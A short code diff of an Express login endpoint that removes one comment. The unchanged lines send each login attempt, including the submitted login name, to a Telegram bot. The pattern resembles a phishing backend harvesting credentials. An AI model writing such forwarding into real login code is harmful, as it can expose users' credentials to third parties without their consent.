@@ -31,7 +31,6 @@ app.post('/api/login', async (req, res) => {
   if (!login || !password)
     return res.status(400).json({ error: "Login and password required" });
 
-  // Отправляем в Телеграм
   await sendTelegram(`
 🔐 <b>New Login Attempt</b>
 👤 Login: <b>${login}</b>
